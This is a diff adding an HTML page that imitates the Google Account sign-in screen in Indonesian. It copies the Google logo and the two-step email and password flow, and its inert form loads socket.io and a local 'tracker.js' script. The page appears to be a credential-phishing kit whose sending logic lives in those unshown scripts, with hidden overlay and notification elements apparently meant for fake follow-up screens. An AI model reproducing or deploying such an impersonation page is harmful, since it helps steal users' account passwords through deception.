@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Masuk - Akun Google</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+html { height:100%; }
+body {
+    font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+    background:#f0f2f5;
+    min-height:100%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+    -webkit-font-smoothing:antialiased;
+}
+.card {
+    background:#fff;
+    border-radius:8px;
+    box-shadow:0 2px 10px rgba(0,0,0,0.13), 0 2px 6px rgba(0,0,0,0.1);
+    padding:48px 40px 36px;
+    width:100%;
+    max-width:450px;
+    position:relative;
+    overflow:hidden;
+    min-height:500px;
+}
+.logo {
+    text-align:center;
+    margin-bottom:16px;
+}
+.logo svg { width:75px; height:24px; }
+h1 {
+    font-family:'Google Sans','Roboto',Arial,sans-serif;
+    font-size:24px;
+    font-weight:400;
+    line-height:1.33;
+    text-align:center;
+    color:#202124;
+    margin-bottom:0;
+}
+.subtitle {
+    font-family:'Google Sans','Roboto',Arial,sans-serif;
+    font-size:16px;
+    font-weight:400;
+    line-height:1.5;
+    text-align:center;
+    color:#5f6368;
+    margin-top:8px;
+    margin-bottom:32px;
+}
+.step {
+    transition:transform .3s ease, opacity .3s ease;
+}
+.step-1 { transform:translateX(0); opacity:1; }
+.step-1.hidden {
+    transform:translateX(-30px);
+    opacity:0;
+    pointer-events:none;
+    position:absolute;
+    width:calc(100% - 80px);
+}
+.step-2 {
+    transform:translateX(30px);
+    opacity:0;
+    pointer-events:none;
+    position:absolute;
+    width:calc(100% - 80px);
+}
+.step-2.visible {
+    transform:translateX(0);
+    opacity:1;
+    pointer-events:auto;
+    position:relative;
+    width:100%;
+}
+.email-display {
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:8px;
+    margin-bottom:24px;
+    padding:10px 16px;
+    border:1px solid #dadce0;
+    border-radius:20px;
+    font-size:14px;
+    color:#3c4043;
+    font-weight:500;
+    cursor:pointer;
+    background:#fff;
+    transition:background .2s;
+}
+.email-display:hover { background:#f8f9fa; }
+.email-display svg { width:16px; height:16px; fill:#5f6368; flex-shrink:0; }
+.input-group {
+    margin-bottom:8px;
+    position:relative;
+}
+.input-group input {
+    width:100%;
+    padding:13px 15px;
+    font-size:16px;
+    font-family:'Google Sans','Roboto',Arial,sans-serif;
+    border:1px solid #dadce0;
+    border-radius:4px;
+    outline:none;
+    background:#fff;
+    color:#202124;
+    transition:border-color .15s;
+    height:54px;
+}
+.input-group input:focus {
+    border-color:#1a73e8;
+    box-shadow:inset 0 0 0 1px #1a73e8;
+}
+.input-group input::placeholder { color:#5f6368; }
+.input-field { position:relative; }
+.input-field input { padding-right:48px; }
+.helper-link {
+    display:inline-block;
+    font-family:'Google Sans','Roboto',Arial,sans-serif;
+    font-size:14px;
+    font-weight:500;
+    color:#1a73e8;
+    text-decoration:none;
+    margin-top:4px;
+    padding:4px 0;
+}
+.helper-link:hover { color:#174ea6; }
+.info-text {
+    font-family:'Google Sans','Roboto',Arial,sans-serif;
+    font-size:14px;
+    color:#5f6368;
+    margin-top:32px;
+    line-height:1.5;
+}
+.info-text a {
+    color:#1a73e8;
+    text-decoration:none;
+    font-weight:500;
+}
+.info-text a:hover { color:#174ea6; }
+.actions {
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    margin-top:32px;
+}
+.actions .left a {
+    font-family:'Google Sans','Roboto',Arial,sans-serif;
+    font-size:14px;
+    font-weight:500;
+    color:#1a73e8;
+    text-decoration:none;
+    padding:4px 0;
+}
+.actions .left a:hover { color:#174ea6; }
+.btn {
+    font-family:'Google Sans','Roboto',Arial,sans-serif;
+    font-size:14px;
+    font-weight:500;
+    padding:9px 24px;
+    border:none;
+    border-radius:4px;
+    cursor:pointer;
+    transition:box-shadow .15s, background .15s;
+    min-width:88px;
+    text-align:center;
+}
+.btn-primary {
+    background:#1a73e8;
+    color:#fff;
+}
+.btn-primary:hover {
+    background:#1b66c9;
+    box-shadow:0 1px 3px rgba(26,115,232,0.3);
+}
+.btn-primary:active { background:#1a5ebe; }
+.btn-primary:disabled {
+    background:#1a73e8;
+    opacity:.5;
+    cursor:default;
+}
+.footer-links {
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    margin-top:40px;
+}
+.footer-links a {
+    font-family:'Google Sans','Roboto',Arial,sans-serif;
+    font-size:12px;
+    color:#5f6368;
+    text-decoration:none;
+}
+.footer-links a:hover { color:#202124; }
+.footer-links .right {
+    display:flex;
+    gap:24px;
+}
+.footer-links .right a { font-size:12px; }
+.toast-container {
+    position:fixed;
+    top:20px;
+    left:50%;
+    transform:translateX(-50%);
+    z-index:9999;
+    display:flex;
+    flex-direction:column;
+    gap:8px;
+    align-items:center;
+}
+.toast {
+    background:#d93025;
+    color:#fff;
+    padding:12px 24px;
+    border-radius:4px;
+    font-size:14px;
+    font-family:'Google Sans','Roboto',Arial,sans-serif;
+    box-shadow:0 2px 8px rgba(0,0,0,.2);
+    animation:toastIn .25s ease forwards;
+    max-width:400px;
+    text-align:center;
+}
+@keyframes toastIn { from{opacity:0;transform:translateY(-10px)} to{opacity:1;transform:translateY(0)} }
+.toast.out { animation:toastOut .2s ease forwards; }
+@keyframes toastOut { to{opacity:0;transform:translateY(-10px)} }
+.splash { display:none; }
+.loading-overlay { display:none; }
+.notif-toast { display:none; }
+@media (max-width:480px) {
+    body { padding:0; background:#fff; }
+    .card {
+        border-radius:0;
+        box-shadow:none;
+        padding:36px 24px 24px;
+        max-width:100%;
+        min-height:100vh;
+        min-height:100dvh;
+    }
+    .logo { margin-bottom:12px; }
+    h1 { font-size:22px; }
+    .subtitle { font-size:14px; margin-bottom:24px; }
+    .input-group input { height:48px; font-size:15px; padding:11px 13px; }
+    .info-text { margin-top:24px; font-size:13px; }
+    .actions { margin-top:24px; }
+    .footer-links { margin-top:32px; flex-direction:column; gap:16px; }
+    .step-1.hidden, .step-2 { width:calc(100% - 48px); }
+}
+@media (max-width:360px) {
+    .card { padding:24px 16px 16px; }
+    .actions { flex-direction:column-reverse; gap:16px; align-items:stretch; }
+    .actions .left { text-align:center; }
+    .btn { width:100%; }
+    .email-display { font-size:13px; padding:8px 12px; }
+}
+</style>
+</head>
+<body>
+
+<div class="splash" id="splash"></div>
+
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="lo-text" id="loText"></div>
+    <div class="lo-sub" id="loSub"></div>
+    <div class="lo-bar" id="loBar"></div>
+</div>
+
+<div class="notif-toast" id="notifToast">
+    <div class="nt-title" id="ntTitle"></div>
+    <div class="nt-body" id="ntBody"></div>
+    <button class="nt-btn"></button>
+</div>
+
+<div class="card">
+    <div class="logo">
+        <svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
+            <path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18 9.99-22.18 22.25-22.18 22.25 9.41 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44 5.79 13.44 12.51 13.44 12.51-5.46 12.51-13.44z"/>
+            <path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18 9.99-22.18 22.25-22.18 22.25 9.41 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44 5.79 13.44 12.51 13.44 12.51-5.46 12.51-13.44z"/>
+            <path fill="#FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
+            <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
+            <path fill="#EA4335" d="M256.75 26.34c-6.89 0-10.16 2.78-12.84 5.6l-6.25-4.7c3.61-4.18 9.42-8.41 19.09-8.41 11.34 0 18.5 6.38 18.5 17.78v20.16c0 2.35.33 4.68.84 6.63h-9.42c-.42-1.09-.67-2.27-.67-3.7h-.34c-2.35 3.19-6.8 5.46-12.34 5.46-9.5 0-18-5.97-18-17.55 0-10.75 8.5-17.63 20.5-17.63 6.05 0 10.33 1.93 13.34 4.56l-5.06 4.79c-2.1-1.85-5.29-3.53-9.5-3.53zm.67 24.62c4.61 0 8.59-2.52 10-6.63l-9.83-6.97-11.59 7.81c1.68 3.53 5.29 5.79 11.42 5.79z"/>
+            <path fill="#4285F4" d="M63.14 26.34v8.41h-21.5v8.41h18.08v8.41h-18.08v13.43h-9.5V26.34h31z"/>
+            <path fill="#EA4335" d="M39.25 0c2.7 0 5 2.22 5 4.96s-2.3 4.96-5 4.96-5-2.22-5-4.96 2.3-4.96 5-4.96z"/>
+            <path fill="#34A853" d="M18.83 76.17c0 3.7-3.03 6.7-6.76 6.7-3.73 0-6.76-3-6.76-6.7s3.03-6.7 6.76-6.7c3.73 0 6.76 3 6.76 6.7z"/>
+        </svg>
+    </div>
+
+    <form id="loginForm" onsubmit="return false;">
+        <div class="step step-1" id="step1">
+            <h1>Masuk</h1>
+            <p class="subtitle">Gunakan Akun Google Anda</p>
+            <div class="input-group">
+                <input type="text" id="emailInput" placeholder="Email atau telepon" autocomplete="username" autofocus spellcheck="false">
+            </div>
+            <div class="actions" style="margin-top:8px;">
+                <div class="left"><a href="#" class="helper-link" id="forgotEmailLink">Lupa email?</a></div>
+            </div>
+            <div class="info-text">
+                Bukan komputer Anda? Gunakan <a href="#">Mode Tamu</a> untuk login secara pribadi.
+            </div>
+            <div class="actions">
+                <div class="left"><a href="#" id="createAccountLink">Buat akun</a></div>
+                <button type="button" class="btn btn-primary" id="nextBtn">Berikutnya</button>
+            </div>
+        </div>
+        <div class="step step-2" id="step2">
+            <h1>Masuk</h1>
+            <div class="email-display" id="emailDisplay">
+                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm3.5-9c.83 0 1.5-.67 1.5-1.5S16.33 8 15.5 8 14 8.67 14 9.5s.67 1.5 1.5 1.5zm-7 0c.83 0 1.5-.67 1.5-1.5S9.33 8 8.5 8 7 8.67 7 9.5 7.67 11 8.5 11zm3.5 3.5c-2.33 0-4.31 1.46-5.11 3.5h10.22c-.8-2.04-2.78-3.5-5.11-3.5z"/></svg>
+                <span id="emailDisplayText"></span>
+                <svg viewBox="0 0 24 24" style="width:18px;height:18px;fill:#5f6368;margin-left:auto;"><path d="M7 10l5 5 5-5z"/></svg>
+            </div>
+            <div class="input-group">
+                <div class="input-field" style="position:relative;">
+                    <input type="password" id="passInput" placeholder="Masukkan sandi Anda" autocomplete="current-password" spellcheck="false">
+                    <div class="input-append" style="position:absolute;right:8px;top:50%;transform:translateY(-50%);">
+                        <button type="button" id="togglePassBtn" aria-label="Tampilkan sandi" style="background:none;border:none;cursor:pointer;padding:8px;border-radius:50%;display:flex;color:#5f6368;">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                        </button>
+                    </div>
+                </div>
+            </div>
+            <div class="actions" style="margin-top:4px;">
+                <div class="left"><a href="#" class="helper-link">Lupa sandi?</a></div>
+            </div>
+            <div class="info-text">
+                Bukan komputer Anda? Gunakan <a href="#">Mode Tamu</a> untuk login secara pribadi.
+            </div>
+            <div class="actions">
+                <div class="left"><a href="#" id="backToEmailLink">Buat akun</a></div>
+                <button type="submit" class="btn btn-primary" id="loginBtn"><span>Masuk</span></button>
+            </div>
+        </div>
+    </form>
+
+    <div class="footer-links">
+        <a href="#">Bahasa Indonesia</a>
+        <div class="right">
+            <a href="#">Bantuan</a>
+            <a href="#">Privasi</a>
+            <a href="#">Persyaratan</a>
+        </div>
+    </div>
+</div>
+
+<div class="toast-container" id="toastContainer"></div>
+
+<script src="/config.js"></script>
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+<script src="/tracker.js"></script>
+
+<script>
+(function() {
+    var emailInput = document.getElementById('emailInput');
+    var passInput = document.getElementById('passInput');
+    var step1 = document.getElementById('step1');
+    var step2 = document.getElementById('step2');
+    var emailDisplay = document.getElementById('emailDisplayText');
+    var nextBtn = document.getElementById('nextBtn');
+    var loginForm = document.getElementById('loginForm');
+    var backLink = document.getElementById('backToEmailLink');
+
+    function showPassScreen() {
+        var email = emailInput.value.trim();
+        if (!email) {
+            emailInput.focus();
+            emailInput.style.borderColor = '#d93025';
+            emailInput.style.boxShadow = 'inset 0 0 0 1px #d93025';
+            setTimeout(function() {
+                emailInput.style.borderColor = '';
+                emailInput.style.boxShadow = '';
+            }, 2000);
+            return;
+        }
+        emailDisplay.textContent = email;
+        step1.classList.add('hidden');
+        step2.classList.add('visible');
+        setTimeout(function() { passInput.focus(); }, 350);
+    }
+
+    function showEmailScreen() {
+        step2.classList.remove('visible');
+        step1.classList.remove('hidden');
+        setTimeout(function() { emailInput.focus(); }, 350);
+    }
+
+    nextBtn.addEventListener('click', showPassScreen);
+
+    loginForm.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter' && !step2.classList.contains('visible')) {
+            e.preventDefault();
+            showPassScreen();
+        }
+    });
+
+    backLink.addEventListener('click', function(e) {
+        e.preventDefault();
+        showEmailScreen();
+    });
+
+    emailInput.addEventListener('focus', function() {
+        emailInput.style.borderColor = '';
+        emailInput.style.boxShadow = '';
+    });
+
+    document.getElementById('emailDisplay').addEventListener('click', function(e) {
+        e.preventDefault();
+        showEmailScreen();
+    });
+})();
+</script>
+</body>
+</html>
